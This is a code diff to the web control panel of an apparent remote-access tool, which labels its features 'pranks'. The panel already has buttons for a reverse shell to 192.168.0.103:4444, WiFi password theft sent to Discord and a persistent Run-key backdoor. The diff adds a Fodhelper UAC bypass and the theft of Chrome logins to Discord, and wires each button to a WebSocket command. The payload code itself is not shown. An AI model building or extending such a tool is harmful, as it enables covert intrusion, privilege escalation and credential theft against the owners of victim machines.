@@ -220,6 +220,8 @@ footer{text-align:center;padding:8px;font-size:.7em;color:#2d3748}
 <button class="pbtn" onclick="if(confirm('RevShell+ to 192.168.0.103:4444?'))runPrank('revshell+')" style="border-color:rgba(255,0,0,.6);background:rgba(255,0,0,.1);color:#ff4444">&#128279; RevShell+</button>
 <button class="pbtn" onclick="if(confirm('Extract WiFi Passwords to Discord?'))runPrank('wifiharvest')" style="border-color:rgba(72,187,120,.4);background:rgba(72,187,120,.08);color:#48bb78">&#128246; WiFi Harvest</button>
 <button class="pbtn" onclick="if(confirm('Install Persistent Backdoor (Run Key)?'))runPrank('persistence')" style="border-color:rgba(246,173,85,.4);background:rgba(246,173,85,.08);color:#f6ad55">&#128376; Persistence</button>
+<button class="pbtn" onclick="if(confirm('Bypass UAC to System/Admin (Fodhelper)?'))runPrank('uacbypass')" style="border-color:rgba(72,187,120,.4);background:rgba(72,187,120,.08);color:#48bb78">&#128275; Bypass UAC</button>
+<button class="pbtn" onclick="if(confirm('Steal Chrome Logins to Discord?'))runPrank('chromeexfil')" style="border-color:rgba(183,148,244,.4);background:rgba(183,148,244,.08);color:#b794f4">&#128272; Chrome Exfil</button>
 </div>
 </div>
 <div class="run-panel kb-hidden" id="runPanel">
@@ -513,7 +515,9 @@ const PRANKS={
   screenshot:'CMD:Screenshot',
   'revshell+':'CMD:RevShell+',
   wifiharvest:'CMD:WiFiHarvest',
-  persistence:'CMD:Persistence'
+  persistence:'CMD:Persistence',
+  uacbypass:'CMD:UACBypass',
+  chromeexfil:'CMD:ChromeExfil'
 };
 function runPrank(id){
   if(!ws||ws.readyState!==1){console.log('[WebKB] WS not connected!');return;}
